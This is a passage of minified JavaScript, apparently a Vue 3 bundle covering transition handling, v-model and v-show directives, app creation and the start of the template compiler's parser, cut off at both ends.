t)n.setProperty(`--${s}`,t[s])}}const TRANSITION$1="transition",ANIMATION="animation",Transition=(e,{slots:t})=>h(BaseTransition,resolveTransitionProps(e),t);Transition.displayName="Transition";const DOMTransitionPropsValidators={name:String,type:String,css:{type:Boolean,default:!0},duration:[String,Number,Object],enterFromClass:String,enterActiveClass:String,enterToClass:String,appearFromClass:String,appearActiveClass:String,appearToClass:String,leaveFromClass:String,leaveActiveClass:String,leaveToClass:String},TransitionPropsValidators=Transition.props=extend({},BaseTransitionPropsValidators,DOMTransitionPropsValidators),callHook=(e,t=[])=>{isArray$2(e)?e.forEach(n=>n(...t)):e&&e(...t)},hasExplicitCallback=e=>e?isArray$2(e)?e.some(t=>t.length>1):e.length>1:!1;function resolveTransitionProps(e){const t={};for(const q in e)q in DOMTransitionPropsValidators||(t[q]=e[q]);if(e.css===!1)return t;const{name:n="v",type:s,duration:r,enterFromClass:o=`${n}-enter-from`,enterActiveClass:l=`${n}-enter-active`,enterToClass:d=`${n}-enter-to`,appearFromClass:u=o,appearActiveClass:f=l,appearToClass:m=d,leaveFromClass:g=`${n}-leave-from`,leaveActiveClass:y=`${n}-leave-active`,leaveToClass:v=`${n}-leave-to`}=e,x=normalizeDuration(r),E=x&&x[0],S=x&&x[1],{onBeforeEnter:w,onEnter:k,onEnterCancelled:C,onLeave:R,onLeaveCancelled:L,onBeforeAppear:O=w,onAppear:I=k,onAppearCancelled:A=C}=t,j=(q,J,K)=>{removeTransitionClass(q,J?m:d),removeTransitionClass(q,J?f:l),K&&K()},G=(q,J)=>{q._isLeaving=!1,removeTransitionClass(q,g),removeTransitionClass(q,v),removeTransitionClass(q,y),J&&J()},X=q=>(J,K)=>{const le=q?I:k,se=()=>j(J,q,K);callHook(le,[J,se]),nextFrame(()=>{removeTransitionClass(J,q?u:o),addTransitionClass(J,q?m:d),hasExplicitCallback(le)||whenTransitionEnds(J,s,E,se)})};return extend(t,{onBeforeEnter(q){callHook(w,[q]),addTransitionClass(q,o),addTransitionClass(q,l)},onBeforeAppear(q){callHook(O,[q]),addTransitionClass(q,u),addTransitionClass(q,f)},onEnter:X(!1),onAppear:X(!0),onLeave(q,J){q._isLeaving=!0;const K=()=>G(q,J);addTransitionClass(q,g),forceReflow(),addTransitionClass(q,y),nextFrame(()=>{q._isLeaving&&(removeTransitionClass(q,g),addTransitionClass(q,v),hasExplicitCallback(R)||whenTransitionEnds(q,s,S,K))}),callHook(R,[q,K])},onEnterCancelled(q){j(q,!1),callHook(C,[q])},onAppearCancelled(q){j(q,!0),callHook(A,[q])},onLeaveCancelled(q){G(q),callHook(L,[q])}})}function normalizeDuration(e){if(e==null)return null;if(isObject$2(e))return[NumberOf(e.enter),NumberOf(e.leave)];{const t=NumberOf(e);return[t,t]}}function NumberOf(e){return toNumber(e)}function addTransitionClass(e,t){t.split(/\s+/).forEach(n=>n&&e.classList.add(n)),(e._vtc||(e._vtc=new Set)).add(t)}function removeTransitionClass(e,t){t.split(/\s+/).forEach(s=>s&&e.classList.remove(s));const{_vtc:n}=e;n&&(n.delete(t),n.size||(e._vtc=void 0))}function nextFrame(e){requestAnimationFrame(()=>{requestAnimationFrame(e)})}let endId=0;function whenTransitionEnds(e,t,n,s){const r=e._endId=++endId,o=()=>{r===e._endId&&s()};if(n)return setTimeout(o,n);const{type:l,timeout:d,propCount:u}=getTransitionInfo(e,t);if(!l)return s();const f=l+"end";let m=0;const g=()=>{e.removeEventListener(f,y),o()},y=v=>{v.target===e&&++m>=u&&g()};setTimeout(()=>{m<u&&g()},d+1),e.addEventListener(f,y)}function getTransitionInfo(e,t){const n=window.getComputedStyle(e),s=x=>(n[x]||"").split(", "),r=s(`${TRANSITION$1}Delay`),o=s(`${TRANSITION$1}Duration`),l=getTimeout(r,o),d=s(`${ANIMATION}Delay`),u=s(`${ANIMATION}Duration`),f=getTimeout(d,u);let m=null,g=0,y=0;t===TRANSITION$1?l>0&&(m=TRANSITION$1,g=l,y=o.length):t===ANIMATION?f>0&&(m=ANIMATION,g=f,y=u.length):(g=Math.max(l,f),m=g>0?l>f?TRANSITION$1:ANIMATION:null,y=m?m===TRANSITION$1?o.length:u.length:0);const v=m===TRANSITION$1&&/\b(transform|all)(,|$)/.test(s(`${TRANSITION$1}Property`).toString());return{type:m,timeout:g,propCount:y,hasTransform:v}}function getTimeout(e,t){for(;e.length<t.length;)e=e.concat(e);return Math.max(...t.map((n,s)=>toMs(n)+toMs(e[s])))}function toMs(e){return Number(e.slice(0,-1).replace(",","."))*1e3}function forceReflow(){return document.body.offsetHeight}const positionMap=new WeakMap,newPositionMap=new WeakMap,TransitionGroupImpl={name:"TransitionGroup",props:extend({},TransitionPropsValidators,{tag:String,moveClass:String}),setup(e,{slots:t}){const n=getCurrentInstance(),s=useTransitionState();let r,o;return onUpdated(()=>{if(!r.length)return;const l=e.moveClass||`${e.name||"v"}-move`;if(!hasCSSTransform(r[0].el,n.vnode.el,l))return;r.forEach(callPendingCbs),r.forEach(recordPosition);const d=r.filter(applyTranslation);forceReflow(),d.forEach(u=>{const f=u.el,m=f.style;addTransitionClass(f,l),m.transform=m.webkitTransform=m.transitionDuration="";const g=f._moveCb=y=>{y&&y.target!==f||(!y||/transform$/.test(y.propertyName))&&(f.removeEventListener("transitionend",g),f._moveCb=null,removeTransitionClass(f,l))};f.addEventListener("transitionend",g)})}),()=>{const l=toRaw(e),d=resolveTransitionProps(l);let u=l.tag||Fragment;r=o,o=t.default?getTransitionRawChildren(t.default()):[];for(let f=0;f<o.length;f++){const m=o[f];m.key!=null&&setTransitionHooks(m,resolveTransitionHooks(m,d,s,n))}if(r)for(let f=0;f<r.length;f++){const m=r[f];setTransitionHooks(m,resolveTransitionHooks(m,d,s,n)),positionMap.set(m,m.el.getBoundingClientRect())}return createVNode(u,null,o)}}},removeMode=e=>delete e.mode;TransitionGroupImpl.props;const TransitionGroup=TransitionGroupImpl;function callPendingCbs(e){const t=e.el;t._moveCb&&t._moveCb(),t._enterCb&&t._enterCb()}function recordPosition(e){newPositionMap.set(e,e.el.getBoundingClientRect())}function applyTranslation(e){const t=positionMap.get(e),n=newPositionMap.get(e),s=t.left-n.left,r=t.top-n.top;if(s||r){const o=e.el.style;return o.transform=o.webkitTransform=`translate(${s}px,${r}px)`,o.transitionDuration="0s",e}}function hasCSSTransform(e,t,n){const s=e.cloneNode();e._vtc&&e._vtc.forEach(l=>{l.split(/\s+/).forEach(d=>d&&s.classList.remove(d))}),n.split(/\s+/).forEach(l=>l&&s.classList.add(l)),s.style.display="none";const r=t.nodeType===1?t:t.parentNode;r.appendChild(s);const{hasTransform:o}=getTransitionInfo(s);return r.removeChild(s),o}const getModelAssigner=e=>{const t=e.props["onUpdate:modelValue"]||!1;return isArray$2(t)?n=>invokeArrayFns(t,n):t};function onCompositionStart(e){e.target.composing=!0}function onCompositionEnd(e){const t=e.target;t.composing&&(t.composing=!1,t.dispatchEvent(new Event("input")))}const vModelText={created(e,{modifiers:{lazy:t,trim:n,number:s}},r){e._assign=getModelAssigner(r);const o=s||r.props&&r.props.type==="number";addEventListener(e,t?"change":"input",l=>{if(l.target.composing)return;let d=e.value;n&&(d=d.trim()),o&&(d=looseToNumber(d)),e._assign(d)}),n&&addEventListener(e,"change",()=>{e.value=e.value.trim()}),t||(addEventListener(e,"compositionstart",onCompositionStart),addEventListener(e,"compositionend",onCompositionEnd),addEventListener(e,"change",onCompositionEnd))},mounted(e,{value:t}){e.value=t??""},beforeUpdate(e,{value:t,modifiers:{lazy:n,trim:s,number:r}},o){if(e._assign=getModelAssigner(o),e.composing||document.activeElement===e&&e.type!=="range"&&(n||s&&e.value.trim()===t||(r||e.type==="number")&&looseToNumber(e.value)===t))return;const l=t??"";e.value!==l&&(e.value=l)}},vModelCheckbox={deep:!0,created(e,t,n){e._assign=getModelAssigner(n),addEventListener(e,"change",()=>{const s=e._modelValue,r=getValue(e),o=e.checked,l=e._assign;if(isArray$2(s)){const d=looseIndexOf(s,r),u=d!==-1;if(o&&!u)l(s.concat(r));else if(!o&&u){const f=[...s];f.splice(d,1),l(f)}}else if(isSet(s)){const d=new Set(s);o?d.add(r):d.delete(r),l(d)}else l(getCheckboxValue(e,o))})},mounted:setChecked,beforeUpdate(e,t,n){e._assign=getModelAssigner(n),setChecked(e,t,n)}};function setChecked(e,{value:t,oldValue:n},s){e._modelValue=t,isArray$2(t)?e.checked=looseIndexOf(t,s.props.value)>-1:isSet(t)?e.checked=t.has(s.props.value):t!==n&&(e.checked=looseEqual(t,getCheckboxValue(e,!0)))}const vModelRadio={created(e,{value:t},n){e.checked=looseEqual(t,n.props.value),e._assign=getModelAssigner(n),addEventListener(e,"change",()=>{e._assign(getValue(e))})},beforeUpdate(e,{value:t,oldValue:n},s){e._assign=getModelAssigner(s),t!==n&&(e.checked=looseEqual(t,s.props.value))}},vModelSelect={deep:!0,created(e,{value:t,modifiers:{number:n}},s){const r=isSet(t);addEventListener(e,"change",()=>{const o=Array.prototype.filter.call(e.options,l=>l.selected).map(l=>n?looseToNumber(getValue(l)):getValue(l));e._assign(e.multiple?r?new Set(o):o:o[0])}),e._assign=getModelAssigner(s)},mounted(e,{value:t}){setSelected(e,t)},beforeUpdate(e,t,n){e._assign=getModelAssigner(n)},updated(e,{value:t}){setSelected(e,t)}};function setSelected(e,t){const n=e.multiple;if(!(n&&!isArray$2(t)&&!isSet(t))){for(let s=0,r=e.options.length;s<r;s++){const o=e.options[s],l=getValue(o);if(n)isArray$2(t)?o.selected=looseIndexOf(t,l)>-1:o.selected=t.has(l);else if(looseEqual(getValue(o),t)){e.selectedIndex!==s&&(e.selectedIndex=s);return}}!n&&e.selectedIndex!==-1&&(e.selectedIndex=-1)}}function getValue(e){return"_value"in e?e._value:e.value}function getCheckboxValue(e,t){const n=t?"_trueValue":"_falseValue";return n in e?e[n]:t}const vModelDynamic={created(e,t,n){callModelHook(e,t,n,null,"created")},mounted(e,t,n){callModelHook(e,t,n,null,"mounted")},beforeUpdate(e,t,n,s){callModelHook(e,t,n,s,"beforeUpdate")},updated(e,t,n,s){callModelHook(e,t,n,s,"updated")}};function resolveDynamicModel(e,t){switch(e){case"SELECT":return vModelSelect;case"TEXTAREA":return vModelText;default:switch(t){case"checkbox":return vModelCheckbox;case"radio":return vModelRadio;default:return vModelText}}}function callModelHook(e,t,n,s,r){const l=resolveDynamicModel(e.tagName,n.props&&n.props.type)[r];l&&l(e,t,n,s)}function initVModelForSSR(){vModelText.getSSRProps=({value:e})=>({value:e}),vModelRadio.getSSRProps=({value:e},t)=>{if(t.props&&looseEqual(t.props.value,e))return{checked:!0}},vModelCheckbox.getSSRProps=({value:e},t)=>{if(isArray$2(e)){if(t.props&&looseIndexOf(e,t.props.value)>-1)return{checked:!0}}else if(isSet(e)){if(t.props&&e.has(t.props.value))return{checked:!0}}else if(e)return{checked:!0}},vModelDynamic.getSSRProps=(e,t)=>{if(typeof t.type!="string")return;const n=resolveDynamicModel(t.type.toUpperCase(),t.props&&t.props.type);if(n.getSSRProps)return n.getSSRProps(e,t)}}const systemModifiers=["ctrl","shift","alt","meta"],modifierGuards={stop:e=>e.stopPropagation(),prevent:e=>e.preventDefault(),self:e=>e.target!==e.currentTarget,ctrl:e=>!e.ctrlKey,shift:e=>!e.shiftKey,alt:e=>!e.altKey,meta:e=>!e.metaKey,left:e=>"button"in e&&e.button!==0,middle:e=>"button"in e&&e.button!==1,right:e=>"button"in e&&e.button!==2,exact:(e,t)=>systemModifiers.some(n=>e[`${n}Key`]&&!t.includes(n))},withModifiers=(e,t)=>(n,...s)=>{for(let r=0;r<t.length;r++){const o=modifierGuards[t[r]];if(o&&o(n,t))return}return e(n,...s)},keyNames={esc:"escape",space:" ",up:"arrow-up",left:"arrow-left",right:"arrow-right",down:"arrow-down",delete:"backspace"},withKeys=(e,t)=>n=>{if(!("key"in n))return;const s=hyphenate(n.key);if(t.some(r=>r===s||keyNames[r]===s))return e(n)},vShow={beforeMount(e,{value:t},{transition:n}){e._vod=e.style.display==="none"?"":e.style.display,n&&t?n.beforeEnter(e):setDisplay(e,t)},mounted(e,{value:t},{transition:n}){n&&t&&n.enter(e)},updated(e,{value:t,oldValue:n},{transition:s}){!t!=!n&&(s?t?(s.beforeEnter(e),setDisplay(e,!0),s.enter(e)):s.leave(e,()=>{setDisplay(e,!1)}):setDisplay(e,t))},beforeUnmount(e,{value:t}){setDisplay(e,t)}};function setDisplay(e,t){e.style.display=t?e._vod:"none"}function initVShowForSSR(){vShow.getSSRProps=({value:e})=>{if(!e)return{style:{display:"none"}}}}const rendererOptions=extend({patchProp},nodeOps);let renderer,enabledHydration=!1;function ensureRenderer(){return renderer||(renderer=createRenderer(rendererOptions))}function ensureHydrationRenderer(){return renderer=enabledHydration?renderer:createHydrationRenderer(rendererOptions),enabledHydration=!0,renderer}const render=(...e)=>{ensureRenderer().render(...e)},hydrate=(...e)=>{ensureHydrationRenderer().hydrate(...e)},createApp=(...e)=>{const t=ensureRenderer().createApp(...e),{mount:n}=t;return t.mount=s=>{const r=normalizeContainer(s);if(!r)return;const o=t._component;!isFunction$1(o)&&!o.render&&!o.template&&(o.template=r.innerHTML),r.innerHTML="";const l=n(r,!1,r instanceof SVGElement);return r instanceof Element&&(r.removeAttribute("v-cloak"),r.setAttribute("data-v-app","")),l},t},createSSRApp=(...e)=>{const t=ensureHydrationRenderer().createApp(...e),{mount:n}=t;return t.mount=s=>{const r=normalizeContainer(s);if(r)return n(r,!0,r instanceof SVGElement)},t};function normalizeContainer(e){return isString$2(e)?document.querySelector(e):e}let ssrDirectiveInitialized=!1;const initDirectivesForSSR=()=>{ssrDirectiveInitialized||(ssrDirectiveInitialized=!0,initVModelForSSR(),initVShowForSSR())},runtimeDom=Object.freeze(Object.defineProperty({__proto__:null,BaseTransition,BaseTransitionPropsValidators,Comment,EffectScope,Fragment,KeepAlive,ReactiveEffect,Static,Suspense,Teleport,Text,Transition,TransitionGroup,VueElement,assertNumber,callWithAsyncErrorHandling,callWithErrorHandling,camelize,capitalize:capitalize$1,cloneVNode,compatUtils,computed,createApp,createBlock,createCommentVNode,createElementBlock,createElementVNode:createBaseVNode,createHydrationRenderer,createPropsRestProxy,createRenderer,createSSRApp,createSlots,createStaticVNode,createTextVNode,createVNode,customRef,defineAsyncComponent,defineComponent,defineCustomElement,defineEmits,defineExpose,defineModel,defineOptions,defineProps,defineSSRCustomElement,defineSlots,get devtools(){return devtools$1},effect,effectScope,getCurrentInstance,getCurrentScope,getTransitionRawChildren,guardReactiveProps,h,handleError,hasInjectionContext,hydrate,initCustomFormatter,initDirectivesForSSR,inject,isMemoSame,isProxy,isReactive,isReadonly,isRef,isRuntimeOnly,isShallow,isVNode:isVNode$1,markRaw,mergeDefaults,mergeModels,mergeProps,nextTick,normalizeClass,normalizeProps,normalizeStyle,onActivated,onBeforeMount,onBeforeUnmount,onBeforeUpdate,onDeactivated,onErrorCaptured,onMounted,onRenderTracked,onRenderTriggered,onScopeDispose,onServerPrefetch,onUnmounted,onUpdated,openBlock,popScopeId,provide,proxyRefs,pushScopeId,queuePostFlushCb,reactive,readonly,ref,registerRuntimeCompiler,render,renderList,renderSlot,resolveComponent,resolveDirective,resolveDynamicComponent,resolveFilter,resolveTransitionHooks,setBlockTracking,setDevtoolsHook,setTransitionHooks,shallowReactive,shallowReadonly,shallowRef,ssrContextKey,ssrUtils,stop,toDisplayString:toDisplayString$1,toHandlerKey,toHandlers,toRaw,toRef,toRefs,toValue,transformVNodeArgs,triggerRef,unref,useAttrs,useCssModule,useCssVars,useModel,useSSRContext,useSlots,useTransitionState,vModelCheckbox,vModelDynamic,vModelRadio,vModelSelect,vModelText,vShow,version,warn:warn$1,watch,watchEffect,watchPostEffect,watchSyncEffect,withAsyncContext,withCtx,withDefaults,withDirectives,withKeys,withMemo,withModifiers,withScopeId},Symbol.toStringTag,{value:"Module"}));function defaultOnError$1(e){throw e}function defaultOnWarn(e){}function createCompilerError(e,t,n,s){const r=e,o=new SyntaxError(String(r));return o.code=e,o.loc=t,o}const FRAGMENT=Symbol(""),TELEPORT=Symbol(""),SUSPENSE=Symbol(""),KEEP_ALIVE=Symbol(""),BASE_TRANSITION=Symbol(""),OPEN_BLOCK=Symbol(""),CREATE_BLOCK=Symbol(""),CREATE_ELEMENT_BLOCK=Symbol(""),CREATE_VNODE=Symbol(""),CREATE_ELEMENT_VNODE=Symbol(""),CREATE_COMMENT=Symbol(""),CREATE_TEXT=Symbol(""),CREATE_STATIC=Symbol(""),RESOLVE_COMPONENT=Symbol(""),RESOLVE_DYNAMIC_COMPONENT=Symbol(""),RESOLVE_DIRECTIVE=Symbol(""),RESOLVE_FILTER=Symbol(""),WITH_DIRECTIVES=Symbol(""),RENDER_LIST=Symbol(""),RENDER_SLOT=Symbol(""),CREATE_SLOTS=Symbol(""),TO_DISPLAY_STRING=Symbol(""),MERGE_PROPS=Symbol(""),NORMALIZE_CLASS=Symbol(""),NORMALIZE_STYLE=Symbol(""),NORMALIZE_PROPS=Symbol(""),GUARD_REACTIVE_PROPS=Symbol(""),TO_HANDLERS=Symbol(""),CAMELIZE=Symbol(""),CAPITALIZE=Symbol(""),TO_HANDLER_KEY=Symbol(""),SET_BLOCK_TRACKING=Symbol(""),PUSH_SCOPE_ID=Symbol(""),POP_SCOPE_ID=Symbol(""),WITH_CTX=Symbol(""),UNREF=Symbol(""),IS_REF=Symbol(""),WITH_MEMO=Symbol(""),IS_MEMO_SAME=Symbol(""),helperNameMap={[FRAGMENT]:"Fragment",[TELEPORT]:"Teleport",[SUSPENSE]:"Suspense",[KEEP_ALIVE]:"KeepAlive",[BASE_TRANSITION]:"BaseTransition",[OPEN_BLOCK]:"openBlock",[CREATE_BLOCK]:"createBlock",[CREATE_ELEMENT_BLOCK]:"createElementBlock",[CREATE_VNODE]:"createVNode",[CREATE_ELEMENT_VNODE]:"createElementVNode",[CREATE_COMMENT]:"createCommentVNode",[CREATE_TEXT]:"createTextVNode",[CREATE_STATIC]:"createStaticVNode",[RESOLVE_COMPONENT]:"resolveComponent",[RESOLVE_DYNAMIC_COMPONENT]:"resolveDynamicComponent",[RESOLVE_DIRECTIVE]:"resolveDirective",[RESOLVE_FILTER]:"resolveFilter",[WITH_DIRECTIVES]:"withDirectives",[RENDER_LIST]:"renderList",[RENDER_SLOT]:"renderSlot",[CREATE_SLOTS]:"createSlots",[TO_DISPLAY_STRING]:"toDisplayString",[MERGE_PROPS]:"mergeProps",[NORMALIZE_CLASS]:"normalizeClass",[NORMALIZE_STYLE]:"normalizeStyle",[NORMALIZE_PROPS]:"normalizeProps",[GUARD_REACTIVE_PROPS]:"guardReactiveProps",[TO_HANDLERS]:"toHandlers",[CAMELIZE]:"camelize",[CAPITALIZE]:"capitalize",[TO_HANDLER_KEY]:"toHandlerKey",[SET_BLOCK_TRACKING]:"setBlockTracking",[PUSH_SCOPE_ID]:"pushScopeId",[POP_SCOPE_ID]:"popScopeId",[WITH_CTX]:"withCtx",[UNREF]:"unref",[IS_REF]:"isRef",[WITH_MEMO]:"withMemo",[IS_MEMO_SAME]:"isMemoSame"};function registerRuntimeHelpers(e){Object.getOwnPropertySymbols(e).forEach(t=>{helperNameMap[t]=e[t]})}const locStub={source:"",start:{line:1,column:1,offset:0},end:{line:1,column:1,offset:0}};function createRoot(e,t=locStub){return{type:0,children:e,helpers:new Set,components:[],directives:[],hoists:[],imports:[],cached:0,temps:0,codegenNode:void 0,loc:t}}function createVNodeCall(e,t,n,s,r,o,l,d=!1,u=!1,f=!1,m=locStub){return e&&(d?(e.helper(OPEN_BLOCK),e.helper(getVNodeBlockHelper(e.inSSR,f))):e.helper(getVNodeHelper(e.inSSR,f)),l&&e.helper(WITH_DIRECTIVES)),{type:13,tag:t,props:n,children:s,patchFlag:r,dynamicProps:o,directives:l,isBlock:d,disableTracking:u,isComponent:f,loc:m}}function createArrayExpression(e,t=locStub){return{type:17,loc:t,elements:e}}function createObjectExpression(e,t=locStub){return{type:15,loc:t,properties:e}}function createObjectProperty(e,t){return{type:16,loc:locStub,key:isString$2(e)?createSimpleExpression(e,!0):e,value:t}}function createSimpleExpression(e,t=!1,n=locStub,s=0){return{type:4,loc:n,content:e,isStatic:t,constType:t?3:s}}function createCompoundExpression(e,t=locStub){return{type:8,loc:t,children:e}}function createCallExpression(e,t=[],n=locStub){return{type:14,loc:n,callee:e,arguments:t}}function createFunctionExpression(e,t=void 0,n=!1,s=!1,r=locStub){return{type:18,params:e,returns:t,newline:n,isSlot:s,loc:r}}function createConditionalExpression(e,t,n,s=!0){return{type:19,test:e,consequent:t,alternate:n,newline:s,loc:locStub}}function createCacheExpression(e,t,n=!1){return{type:20,index:e,value:t,isVNode:n,loc:locStub}}function createBlockStatement(e){return{type:21,body:e,loc:locStub}}function getVNodeHelper(e,t){return e||t?CREATE_VNODE:CREATE_ELEMENT_VNODE}function getVNodeBlockHelper(e,t){return e||t?CREATE_BLOCK:CREATE_ELEMENT_BLOCK}function convertToBlock(e,{helper:t,removeHelper:n,inSSR:s}){e.isBlock||(e.isBlock=!0,n(getVNodeHelper(s,e.isComponent)),t(OPEN_BLOCK),t(getVNodeBlockHelper(s,e.isComponent)))}const isStaticExp=e=>e.type===4&&e.isStatic,isBuiltInType=(e,t)=>e===t||e===hyphenate(t);function isCoreComponent(e){if(isBuiltInType(e,"Teleport"))return TELEPORT;if(isBuiltInType(e,"Suspense"))return SUSPENSE;if(isBuiltInType(e,"KeepAlive"))return KEEP_ALIVE;if(isBuiltInType(e,"BaseTransition"))return BASE_TRANSITION}const nonIdentifierRE=/^\d|[^\$\w]/,isSimpleIdentifier=e=>!nonIdentifierRE.test(e),validFirstIdentCharRE=/[A-Za-z_$\xA0-\uFFFF]/,validIdentCharRE=/[\.\?\w$\xA0-\uFFFF]/,whitespaceRE=/\s+[.[]\s*|\s*[.[]\s+/g,isMemberExpressionBrowser=e=>{e=e.trim().replace(whitespaceRE,l=>l.trim());let t=0,n=[],s=0,r=0,o=null;for(let l=0;l<e.length;l++){const d=e.charAt(l);switch(t){case 0:if(d==="[")n.push(t),t=1,s++;else if(d==="(")n.push(t),t=2,r++;else if(!(l===0?validFirstIdentCharRE:validIdentCharRE).test(d))return!1;break;case 1:d==="'"||d==='"'||d==="`"?(n.push(t),t=3,o=d):d==="["?s++:d==="]"&&(--s||(t=n.pop()));break;case 2:if(d==="'"||d==='"'||d==="`")n.push(t),t=3,o=d;else if(d==="(")r++;else if(d===")"){if(l===e.length-1)return!1;--r||(t=n.pop())}break;case 3:d===o&&(t=n.pop(),o=null);break}}return!s&&!r},isMemberExpression=isMemberExpressionBrowser;function getInnerRange(e,t,n){const r={source:e.source.slice(t,t+n),start:advancePositionWithClone(e.start,e.source,t),end:e.end};return n!=null&&(r.end=advancePositionWithClone(e.start,e.source,t+n)),r}function advancePositionWithClone(e,t,n=t.length){return advancePositionWithMutation(extend({},e),t,n)}function advancePositionWithMutation(e,t,n=t.length){let s=0,r=-1;for(let o=0;o<n;o++)t.charCodeAt(o)===10&&(s++,r=o);return e.offset+=n,e.line+=s,e.column=r===-1?e.column+n:n-r,e}function findDir(e,t,n=!1){for(let s=0;s<e.props.length;s++){const r=e.props[s];if(r.type===7&&(n||r.exp)&&(isString$2(t)?r.name===t:t.test(r.name)))return r}}function findProp(e,t,n=!1,s=!1){for(let r=0;r<e.props.length;r++){const o=e.props[r];if(o.type===6){if(n)continue;if(o.name===t&&(o.value||s))return o}else if(o.name==="bind"&&(o.exp||s)&&isStaticArgOf(o.arg,t))return o}}function isStaticArgOf(e,t){return!!(e&&isStaticExp(e)&&e.content===t)}function hasDynamicKeyVBind(e){return e.props.some(t=>t.type===7&&t.name==="bind"&&(!t.arg||t.arg.type!==4||!t.arg.isStatic))}function isText$1(e){return e.type===5||e.type===2}function isVSlot(e){return e.type===7&&e.name==="slot"}function isTemplateNode(e){return e.type===1&&e.tagType===3}function isSlotOutlet(e){return e.type===1&&e.tagType===2}const propsHelperSet=new Set([NORMALIZE_PROPS,GUARD_REACTIVE_PROPS]);function getUnnormalizedProps(e,t=[]){if(e&&!isString$2(e)&&e.type===14){const n=e.callee;if(!isString$2(n)&&propsHelperSet.has(n))return getUnnormalizedProps(e.arguments[0],t.concat(e))}return[e,t]}function injectProp(e,t,n){let s,r=e.type===13?e.props:e.arguments[2],o=[],l;if(r&&!isString$2(r)&&r.type===14){const d=getUnnormalizedProps(r);r=d[0],o=d[1],l=o[o.length-1]}if(r==null||isString$2(r))s=createObjectExpression([t]);else if(r.type===14){const d=r.arguments[0];!isString$2(d)&&d.type===15?hasProp(t,d)||d.properties.unshift(t):r.callee===TO_HANDLERS?s=createCallExpression(n.helper(MERGE_PROPS),[createObjectExpression([t]),r]):r.arguments.unshift(createObjectExpression([t])),!s&&(s=r)}else r.type===15?(hasProp(t,r)||r.properties.unshift(t),s=r):(s=createCallExpression(n.helper(MERGE_PROPS),[createObjectExpression([t]),r]),l&&l.callee===GUARD_REACTIVE_PROPS&&(l=o[o.length-2]));e.type===13?l?l.arguments[0]=s:e.props=s:l?l.arguments[0]=s:e.arguments[2]=s}function hasProp(e,t){let n=!1;if(e.key.type===4){const s=e.key.content;n=t.properties.some(r=>r.key.type===4&&r.key.content===s)}return n}function toValidAssetId(e,t){return`_${t}_${e.replace(/[^\w]/g,(n,s)=>n==="-"?"_":e.charCodeAt(s).toString())}`}function getMemoedVNodeCall(e){return e.type===14&&e.callee===WITH_MEMO?e.arguments[1].returns:e}function getCompatValue(e,t){const n=t.options?t.options.compatConfig:t.compatConfig,s=n&&n[e];return e==="MODE"?s||3:s}function isCompatEnabled(e,t){const n=getCompatValue("MODE",t),s=getCompatValue(e,t);return n===3?s===!0:s!==!1}function checkCompatEnabled(e,t,n,...s){return isCompatEnabled(e,t)}const decodeRE=/&(gt|lt|amp|apos|quot);/g,decodeMap={gt:">",lt:"<",amp:"&",apos:"'",quot:'"'},defaultParserOptions={delimiters:["{{","}}"],getNamespace:()=>0,getTextMode:()=>0,isVoidTag:NO,isPreTag:NO,isCustomElement:NO,decodeEntities:e=>e.replace(decodeRE,(t,n)=>decodeMap[n]),onError:defaultOnError$1,onWarn:defaultOnWarn,comments:!1};function baseParse(e,t={}){const n=createParserContext(e,t),s=getCursor(n);return createRoot(parseChildren(n,0,[]),getSelection(n,s))}function createParserContext(e,t){const n=extend({},defaultParserOptions);let s;for(s in t)n[s]=t[s]===void 0?defaultParserOptions[s]:t[s];return{options:n,column:1,line:1,offset:0,originalSource:e,source:e,inPre:!1,inVPre:!1,onWarn:n.onWarn}}function parseChildren(e,t,n){const s=last(n),r=s?s.ns:0,o=[];for(;!isEnd(e,t,n);){const d=e.source;let u;if(t===0||t===1){if(!e.inVPre&&startsWith(d,e.options.delimiters[0]))u=parseInterpolation(e,t);else if(t===0&&d[0]==="<")if(d.length===1)emitError(e,5,1);else if(d[1]==="!")startsWith(d,"<!--")?u=parseComment(e):startsWith(d,"<!DOCTYPE")?u=parseBogusComment(e):startsWith(d,"<![CDATA[")?r!==0?u=parseCDATA(e,n):(emitError(e,1),u=parseBogusComment(e)):(emitError(e,11),u=parseBogusComment(e));else if(d[1]==="/")if(d.length===2)emitError(e,5,2);else if(d[2]===">"){emitError(e,14,2),advanceBy(e,3);continue}else if(/[a-z]/i.test(d[2])){emitError(e,23),parseTag(e,TagType.End,s);continue}else emitError(e,12,2),u=parseBogusComment(e);else/[a-z]/i.test(d[1])?(u=parseElement(e,n),isCompatEnabled("COMPILER_NATIVE_TEMPLATE",e)&&u&&u.tag==="template"&&!u.props.some(f=>f.type===7&&isSpecialTemplateDirective(f.name))&&(u=u.children)):d[1]==="?"?(emitError(e,21,1),u=parseBogusComment(e)):emitError(e,12,1)}if(u||(u=parseText(e,t)),isArray$2(u))for(let f=0;f<u.length;f++)pushNode(o,u[f]);else pushNode(o,u)}let l=!1;if(t!==2&&t!==1){const d=e.options.whitespace!=="preserve";for(let u=0;u<o.length;u++){const f=o[u];if(f.type===2)if(e.inPre)f.content=f.content.replace(/\r\n/g,`
`);else if(/[^\t\r\n\f ]/.test(f.content))d&&(f.content=f.content.replace(/[\t\r\n\f ]+/g," "));else{const m=o[u-1],g=o[u+1];!m||!g||d&&(m.type===3&&g.type===3||m.type===3&&g.type===1||m.type===1&&g.type===3||m.type===1&&g.type===1&&/[\r\n]/.test(f.content))?(l=!0,o[u]=null):f.content=" "}else f.type===3&&!e.options.comments&&(l=!0,o[u]=null)}if(e.inPre&&s&&e.options.isPreTag(s.tag)){const u=o[0];u&&u.type===2&&(u.content=u.content.replace(/^\r?\n/,""))}}return l?o.filter(Boolean):o}function pushNode(e,t){if(t.type===2){const n=last(e);if(n&&n.type===2&&n.loc.end.offset===t.loc.start.offset){n.content+=t.content,n.loc.end=t.loc.end,n.loc.source+=t.loc.source;return}}e.push(t)}function parseCDATA(e,t){advanceBy(e,9);const n=parseChildren(e,3,t);return e.source.length===0?emitError(e,6):advanceBy(e,3),n}function parseComment(e){const t=getCursor(e);let n;const s=/--(\!)?>/.exec(e.source);if(!s)n=e.source.slice(4),advanceBy(e,e.source.length),emitError(e,7);else{s.index<=3&&emitError(e,0),s[1]&&emitError(e,10),n=e.source.slice(4,s.index);const r=e.source.slice(0,s.index);let o=1,l=0;for(;(l=r.indexOf("<!--",o))!==-1;)advanceBy(e,l-o+1),l+4<r.length&&emitError(e,16),o=l+1;advanceBy(e,s.index+s[0].length-o+1)}return{type:3,content:n,loc:getSelection(e,t)}}function parseBogusComment(e){const t=getCursor(e),n=e.source[1]==="?"?1:2;let s;const r=e.source.indexOf(">");return 